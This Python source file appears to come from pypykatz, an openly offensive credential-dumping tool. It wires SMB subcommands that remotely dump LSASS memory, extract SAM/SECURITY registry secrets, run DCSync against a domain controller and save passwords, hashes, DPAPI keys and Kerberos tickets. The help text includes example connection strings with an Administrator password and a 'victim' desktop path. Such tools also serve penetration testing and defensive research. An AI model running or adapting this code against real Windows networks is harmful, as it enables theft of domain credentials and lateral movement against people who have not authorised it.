

#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import os
import json
import ntpath
import platform
import argparse

from pypykatz import logging
from pypykatz.commons.common import UniversalEncoder
from pypykatz.alsadecryptor.packages.msv.decryptor import LogonSession
import asyncio

"""
This is a wrapper for aiosmb
"""

class SMBCMDArgs:
	def __init__(self):
		self.smb_url = None
		self.verbose = 0
		self.silent = True
		self.smb_url = None
		self.no_interactive = False
		self.commands = ['login', 'i']

smb_live_epilog = 'FOR AVAILABLE SUBCOMMANDS TYPE "... smb help" insted of "-h" '
class SMBCMDHelper:
	def __init__(self):
		self.live_keywords = ['smb']
		self.keywords = ['smb']
		
	def add_args(self, parser, live_parser):
		smb_group = parser.add_parser('smb', help='SMB related commands')
		smb_subparsers = smb_group.add_subparsers()
		smb_subparsers.required = True
		smb_subparsers.dest = 'smb_module'

		smb_console_group = smb_subparsers.add_parser('console', help='SMB client. Use "help" instead of "-h" to get the available subcommands')
		smb_console_group.add_argument('-v', '--verbose', action='count', default=0, help='Verbosity, can be stacked')
		smb_console_group.add_argument('url', help="SMB connection string")
		smb_console_group.add_argument('commands', nargs='*', help="!OPTIONAL! Takes a series of commands which will be executed until error encountered. If the command is 'i' is encountered during execution it drops back to interactive shell.")
		
		smb_lsassfile_group = smb_subparsers.add_parser('lsassfile', help='Parse a remote LSASS dump file.')
		smb_lsassfile_group.add_argument('url', help="SMB connection string with file in path field. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/C$/Users/victim/Desktop/lsass.DMP'")
		smb_lsassfile_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		smb_lsassfile_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_lsassfile_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		smb_lsassfile_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')

		smb_lsassdump_group = smb_subparsers.add_parser('lsassdump', help='Yes.')
		smb_lsassdump_group.add_argument('url', help="SMB connection string Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102'")
		smb_lsassdump_group.add_argument('-m','--method', choices=['taskexec'] , default = 'taskexec', help = 'Print credentials in JSON format')
		smb_lsassdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		smb_lsassdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_lsassdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		smb_lsassdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')


		smb_regfile_group = smb_subparsers.add_parser('regfile', help='Parse a remote registry hive dumps')
		smb_regfile_group.add_argument('url', help="SMB connection string with folder in path field. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/C$/Users/victim/Desktop/'")
		smb_regfile_group.add_argument('system', help='path to the SYSTEM registry hive')
		smb_regfile_group.add_argument('--sam', help='path to the SAM registry hive')
		smb_regfile_group.add_argument('--security', help='path to the SECURITY registry hive')
		smb_regfile_group.add_argument('--software', help='path to the SOFTWARE registry hive')
		smb_regfile_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_regfile_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		
		smb_regsec_group = smb_subparsers.add_parser('regdump', help='Regsecrets')
		smb_regsec_group.add_argument('url', help="SMB connection string. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102'")
		smb_regsec_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_regsec_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')

		smb_dcsync_group = smb_subparsers.add_parser('dcsync', help='DcSync')
		smb_dcsync_group.add_argument('url', help="SMB connection string with folder in path field. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/'")
		smb_dcsync_group.add_argument('-u', '--username', help='taget username')
		smb_dcsync_group.add_argument('-o', '--outfile', help = 'Save results to file')

		smb_secretsdump_group = smb_subparsers.add_parser('secretsdump', help='secretsdump')
		smb_secretsdump_group.add_argument('url', help="SMB connection string with folder in path field. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/'")
		smb_secretsdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
		smb_secretsdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
		smb_secretsdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
		smb_secretsdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')


		live_subcommand_parser = argparse.ArgumentParser(add_help=False)                                                                                                  
		live_smb_subparsers = live_subcommand_parser.add_subparsers(help = 'LIVE DPAPI commands work under the current user context. Except: keys, wifi, chrome')
		live_smb_subparsers.required = True
		live_smb_subparsers.dest = 'livesmbcommand'

		live_console_parser = live_smb_subparsers.add_parser('console', help = 'SMB (live) client. Use "help" instead of "-h" to get the available subcommands')
		live_console_parser.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'ntlm', help= 'Authentication method to use during login')
		live_console_parser.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
		live_console_parser.add_argument('-v', '--verbose', action='count', default=0, help='Verbosity, can be stacked')
		live_console_parser.add_argument('host', help='Target host to connect to')
		live_console_parser.add_argument('commands', nargs='*', help="!OPTIONAL! Takes a series of commands which will be executed until error encountered. If the command is 'i' is encountered during execution it drops back to interactive shell.")

		live_group = live_parser.add_parser('smb', help='SMB (live) commands', epilog=smb_live_epilog, parents=[live_subcommand_parser])
		
		
	def execute(self, args):
		if args.command in self.keywords:
			asyncio.run(self.run(args))
		
		if len(self.live_keywords) > 0 and args.command == 'live' and args.module in self.live_keywords:
			asyncio.run(self.run_live(args))
			
			
	async def run_live(self, args):
		if platform.system().lower() != 'windows':
			raise Exception('Live commands only work on Windows!')

		from aiosmb import logger as smblog

		if args.verbose == 0:
			smblog.setLevel(100)
		elif args.verbose == 1:
			smblog.setLevel(level=logging.INFO)
		else:
			level = 5 - args.verbose
			smblog.setLevel(level=level)

		if args.livesmbcommand == 'console':
			from aiosmb.examples.smbclient import amain
			from winacl.functions.highlevel import get_logon_info
			info = get_logon_info()
			la = SMBCMDArgs()
			la.smb_url = 'smb%s+sspi-%s://%s\\%s@%s' % (args.protocol_version, args.authmethod, info['domain'], info['username'], args.host)
			la.verbose = args.verbose

			if args.commands is not None and len(args.commands) > 0:
				la.commands = []
				if args.commands[0] == 'help':
					la.commands = ['help']
				else:
					if args.commands[0] != 'login':
						la.commands.append('login')
					
					for command in args.commands:
						la.commands.append(command)

			await amain(la)
			
	async def run(self, args):

		from aiosmb import logger as smblog

		if args.verbose == 0:
			smblog.setLevel(100)
		elif args.verbose == 1:
			smblog.setLevel(level=logging.INFO)
		else:
			level = 5 - args.verbose
			smblog.setLevel(level=level)
		
		if args.smb_module == 'lsassfile':
			from pypykatz.smb.lsassutils import lsassfile
			mimi = await lsassfile(args.url)
			self.process_results({'smbfile':mimi}, [], args)

		elif args.smb_module == 'lsassdump':
			from pypykatz.smb.lsassutils import lsassdump
			mimi = await lsassdump(args.url)
			self.process_results({'smbfile':mimi}, [], args)

		elif args.smb_module == 'secretsdump':
			from pypykatz.smb.lsassutils import lsassdump
			from pypykatz.smb.regutils import regdump
			from pypykatz.smb.dcsync import dcsync

			try:
				mimi = await lsassdump(args.url)
				if mimi is not None:
					self.process_results({'smbfile':mimi}, [], args, file_prefix='_lsass.txt')
			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to get LSASS secrets')
			
			try:
				po = await regdump(args.url)
				if po is not None:
					if args.outfile:
						po.to_file(args.outfile+'_registry.txt', args.json)
					else:
						if args.json:
							print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
						else:
							print(str(po))
			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to get registry secrets')
			

			try:
				if args.outfile is not None:
					outfile = open(args.outfile+'_dcsync.txt', 'w', newline = '')

				async for secret in dcsync(args.url):
					if args.outfile is not None:
						outfile.write(str(secret))
					else:
						print(str(secret))

			except Exception as e:
				logging.exception('[SECRETSDUMP] Failed to perform DCSYNC')
			finally:
				if args.outfile is not None:
					outfile.close()
		
		elif args.smb_module == 'dcsync':
			from pypykatz.smb.dcsync import dcsync
			
			if args.outfile is not None:
				outfile = open(args.outfile, 'w', newline = '')

			async for secret in dcsync(args.url, args.username):
				if args.outfile is not None:
					outfile.write(str(secret))
				else:
					print(str(secret))

			if args.outfile is not None:
				outfile.close()
		
		elif args.smb_module == 'regdump':
			from pypykatz.smb.regutils import regdump
			po = await regdump(args.url)

			if po is not None:
				if args.outfile:
					po.to_file(args.outfile, args.json)
				else:
					if args.json:
						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
					else:
						print(str(po))
		
		elif args.smb_module == 'regfile':
			from pypykatz.smb.regutils import regfile
			po = await regfile(args.url, args.system, sam = args.sam, security = args.security, software = args.software)

			if po is not None:
				if args.outfile:
					po.to_file(args.outfile, args.json)
				else:
					if args.json:
						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
					else:
						print(str(po))

		elif args.smb_module == 'console':
			from aiosmb.examples.smbclient import amain
			la = SMBCMDArgs()
			la.smb_url = args.url
			la.verbose = args.verbose
			if args.commands is not None and len(args.commands) > 0:
				la.commands = []
				if args.commands[0] == 'help':
					la.commands = ['help']
				else:
					if args.commands[0] != 'login':
						la.commands.append('login')
					
					for command in args.commands:
						la.commands.append(command)

			await amain(la)

	def process_results(self, results, files_with_error, args, file_prefix = ''):
		if args.outfile and args.json:
			with open(args.outfile+file_prefix, 'w') as f:
				json.dump(results, f, cls = UniversalEncoder, indent=4, sort_keys=True)

		elif args.outfile and args.grep:
			with open(args.outfile+file_prefix, 'w', newline = '') as f:
				f.write(':'.join(LogonSession.grep_header) + '\r\n')
				for result in results:
					for luid in results[result].logon_sessions:
						for row in results[result].logon_sessions[luid].to_grep_rows():
							f.write(':'.join(row) + '\r\n')
		
		elif args.outfile:
			with open(args.outfile+file_prefix, 'w') as f:
				for result in results:
					f.write('FILE: ======== %s =======\n' % result)
					
					for luid in results[result].logon_sessions:
						f.write('\n'+str(results[result].logon_sessions[luid]))
					
					if len(results[result].orphaned_creds) > 0:
						f.write('\n== Orphaned credentials ==\n')
						for cred in results[result].orphaned_creds:
							f.write(str(cred))
					
				if len(files_with_error) > 0:
					f.write('\n== Failed to parse these files:\n')
					for filename in files_with_error:
						f.write('%s\n' % filename)
						
		elif args.json:
			print(json.dumps(results, cls = UniversalEncoder, indent=4, sort_keys=True))
		
		elif args.grep:
			print(':'.join(LogonSession.grep_header))
			for result in results:
				for luid in results[result].logon_sessions:
					for row in results[result].logon_sessions[luid].to_grep_rows():
						print(':'.join(row))
				for cred in results[result].orphaned_creds:
					t = cred.to_dict()
					if t['credtype'] != 'dpapi':
						if t['password'] is not None:
							x =  [str(t['credtype']), str(t['domainname']), str(t['username']), '', '', '', '', '', str(t['password'])]
							print(':'.join(x))
					else:
						t = cred.to_dict()
						x = [str(t['credtype']), '', '', '', '', '', str(t['masterkey']), str(t['sha1_masterkey']), str(t['key_guid']), '']
						print(':'.join(x))
		else:
			for result in results:
				print('FILE: ======== %s =======' % result)	
				if isinstance(results[result], str):
					print(results[result])
				else:
					for luid in results[result].logon_sessions:
						print(str(results[result].logon_sessions[luid]))
							
					if len(results[result].orphaned_creds) > 0:
						print('== Orphaned credentials ==')
						for cred in results[result].orphaned_creds:
							print(str(cred))
							
					

			if len(files_with_error) > 0:			
				print('\n==== Parsing errors:')
				for filename in files_with_error:
					print(filename)
		
		
		if args.kerberos_dir:
			dir = os.path.abspath(args.kerberos_dir)
			logging.info('Writing kerberos tickets to %s' % dir)
			for filename in results:
				base_filename = ntpath.basename(filename)
				ccache_filename = '%s_%s.ccache' % (base_filename, os.urandom(4).hex()) #to avoid collisions
				results[filename].kerberos_ccache.to_file(os.path.join(dir, ccache_filename))
				for luid in results[filename].logon_sessions:
					for kcred in results[filename].logon_sessions[luid].kerberos_creds:
						for ticket in kcred.tickets:
							ticket.to_kirbi(dir)
							
				for cred in results[filename].orphaned_creds:
					if cred.credtype == 'kerberos':
						for ticket in cred.tickets:
							ticket.to_kirbi(dir)